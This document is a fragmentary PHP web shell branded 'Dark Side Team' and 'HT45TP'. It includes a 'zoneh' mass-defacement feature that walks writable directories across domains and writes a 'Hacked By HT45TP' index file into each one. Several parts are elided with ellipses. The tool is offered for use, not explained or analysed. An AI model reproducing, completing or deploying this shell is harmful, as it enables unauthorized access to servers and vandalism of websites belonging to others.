...
<body>
<h1><center><img src="https://c.top4top.net/p_11004tbku0.gif" height="350 width="350"><font color="white" face=""><div class="lazy">5TP_GANS</font></center></h1>
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='HT45TP'><br>
		<u>Domains</u>: <br>
		...
		if(is_writable($dir)) {
			...
			foreach($dira as $dirb) {
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "<font color=lime>http://</font>$dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
	...
	<input type='text' name='d_file' value='noid.txt' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By HT45TP</textarea><br>
...
echo '<center><br/>recoded : HT45TP</center>
</body>
</html>';
function perms($file){
...
if($send)
    echo "<h1>we life on the dark side</h1>";
    else
        echo "<h1>Dark Side Team</h1>";
?></center>
